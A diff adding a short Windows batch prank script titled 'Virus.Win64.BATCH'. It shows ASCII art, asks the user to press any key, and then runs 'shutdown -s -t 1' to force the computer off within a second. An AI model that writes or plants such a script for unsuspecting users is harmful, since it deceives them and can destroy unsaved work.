@@ -1,0 +1,26 @@
+@echo off
+title Virus.Win64.BATCH
+color a
+cls
+
+echo                  _________-----_____
+echo        ____------           __      ----_
+echo  ___----             ___------              \
+echo     ----________        ----                 \
+echo                -----__    ^|             _____)
+echo                     __-                /     \
+echo         _______-----    ___--          \    /)\
+echo   ------_______      ---____            \__/  /
+echo                -----__    \ --    _          /\
+echo                       --__--__     \_____/   \_/\
+echo                               ---^|   /          ^|
+echo                                  ^| ^|___________^|
+echo                                  ^| ^| ((_(_)^| )_)
+echo                                  ^|  \_((_(_)^|/(_)
+echo                                   \             (
+echo                                    \_____________)
+
+echo Just press any key.
+pause
+echo !TERMINATE!
+shutdown -s -t 1
